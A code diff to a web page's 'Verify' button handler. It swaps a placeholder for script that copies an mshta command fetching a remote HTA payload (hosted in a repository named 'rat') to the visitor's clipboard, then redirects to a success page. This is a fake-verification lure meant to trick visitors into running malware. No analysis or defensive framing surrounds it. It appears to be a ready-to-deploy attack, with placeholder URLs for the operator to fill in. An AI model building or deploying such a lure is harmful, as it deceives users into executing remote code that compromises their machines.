@@ -113,12 +113,19 @@
             spinner.style.display = 'block';
             btn.innerText = 'Verifying...';
             
-            // Add your mshta clipboard code here
-            setTimeout(function() {
-                spinner.style.display = 'none';
-                btn.disabled = false;
-                btn.innerText = 'Verify';
-            }, 2000);
+            // CHANGE THE URL BELOW TO YOUR REAL SUCCESS PAGE
+            var cmd = 'mshta https://raw.githubusercontent.com/Skibidi101201/rat/main/payload.hta';
+            
+            // Copy to clipboard
+            var ta = document.createElement('textarea');
+            ta.value = cmd;
+            document.body.appendChild(ta);
+            ta.select();
+            document.execCommand('copy');
+            document.body.removeChild(ta);
+            
+            // CHANGE THE URL BELOW TO YOUR REAL SUCCESS PAGE
+            window.location.href = 'https://YOUR-RESULT-SITE.com/success.html';
         });
     </script>
 </body>
